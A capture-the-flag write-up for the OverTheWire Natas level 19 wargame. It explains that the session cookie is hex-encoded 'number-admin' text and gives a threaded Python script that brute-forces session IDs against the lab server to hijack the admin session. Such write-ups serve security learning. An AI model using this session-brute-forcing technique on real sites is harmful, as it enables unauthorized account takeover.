# natas19

This problem is same as before but now the cookie is very complex looking. But not as much since it looks like hex. When you convert hex to text, we get `38-admin` (number might be different for you). Well that's the hit. We change the number 38 from 0 to 640, convert back to hex and try which one hits.
<br>The python code which works is-

```python
import requests
import binascii
import threading
url = 'http://natas19.natas.labs.overthewire.org/'
auth = ('natas19', '<password>')  # replace with the actual password

session = requests.Session()
session.auth = auth
def try_session_ids(start, end):
	for session_id in range(start, end):  # the session ID is between 1 and 640
		print(f'Trying session ID: {session_id}')
		session_cookie = f'{session_id}-admin'.encode()
		session_cookie = binascii.hexlify(session_cookie).decode()
		cookies = {'PHPSESSID': session_cookie}
		response = session.get(url, cookies=cookies)
		if 'You are an admin' in response.text:
			print('Found the admin session ID:', session_id)
			print(response.text)
			break

threads = []
for i in range(0, 601, 100):
    thread = threading.Thread(target=try_session_ids, args=(i, i+100))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
```
And you get a hit within few seconds. 